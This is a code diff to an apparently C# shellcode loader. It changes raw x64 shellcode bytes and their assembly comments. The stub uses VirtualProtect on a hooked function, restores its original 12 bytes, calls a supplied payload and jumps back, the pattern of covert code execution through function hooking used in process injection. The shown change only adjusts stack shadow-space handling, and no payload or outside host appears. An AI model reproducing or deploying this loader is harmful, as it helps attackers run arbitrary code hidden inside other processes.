@@ -272,9 +272,9 @@ internal static class Program
         /* 0020 */ 0x0C, 0x00, 0x00, 0x00, 0x49, 0xC7, 0xC0, 0x40, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0C, 0x24, 0xFF, 
         /* 0030 */ 0xD6, 0x48, 0xB8, 0xDD, 0xDD, 0xCC, 0xCC, 0xAA, 0xAA, 0x99, 0x99, 0x48, 0x89, 0x03, 0xB8, 0x09, 
         /* 0040 */ 0x09, 0x09, 0x09, 0x89, 0x43, 0x08, 0x48, 0x8B, 0xCB, 0x48, 0xC7, 0xC2, 0x0C, 0x00, 0x00, 0x00, 
-        /* 0050 */ 0x49, 0xC7, 0xC0, 0x20, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0C, 0x24, 0xFF, 0xD6, 0x48, 0x83, 0xC4, 
-        /* 0060 */ 0x28, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x0B, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x48, 0x8B, 
-        /* 0070 */ 0xCB, 0x5B, 0x5E, 0xFF, 0xE1
+        /* 0050 */ 0x49, 0xC7, 0xC0, 0x20, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x0C, 0x24, 0xFF, 0xD6, 0x48, 0x83, 0xEC, 
+        /* 0060 */ 0x18, 0xE8, 0x0B, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x48, 0x8B, 0xCB, 0x5B, 0x5E, 0xFF,
+        /* 0070 */ 0xE1
     };
     
     private static IntPtr GetModuleHandle(string dll)
@@ -332,6 +332,7 @@ internal static class Program
             mov r8, 40h                   ; Arg 3: PAGE_EXECUTE_READWRITE (0x40)
             lea r9, [rsp]                 ; Arg 4: oldProtect pointer
             call rsi                      ; Call VirtualProtect
+            ; leave old shadow space
 
             ; ==========================================
             ; RESTORE ORIGINAL 12 BYTES in hooked func
@@ -344,17 +345,17 @@ internal static class Program
             ; ==========================================
             ; VIRTUALPROTECT (Change back to RX)
             ; ==========================================
+            ; reuse old shadow space from above
             mov rcx, rbx            ; Arg 1: hookedFunc
             mov rdx, 12             ; Arg 2: Size
             mov r8, 20h             ; Arg 3: PAGE_EXECUTE_READ (0x20)
             lea r9, [rsp]           ; Arg 4: oldProtect pointer
             call rsi                ; Call VirtualProtect
-            add rsp, 28h            ; Clean up stack
 
             ; ==========================================
             ; CALL THE SHELLCODE
             ; ==========================================
-            sub rsp, 40h            ; Allocate shadow space
+            sub rsp, 18h            ; Allocate shadow space (-40h+28h from before)
             call Payload            ; Call the actual supplied payload (call +11h)
             add rsp, 40h            ; Clean up stack
 
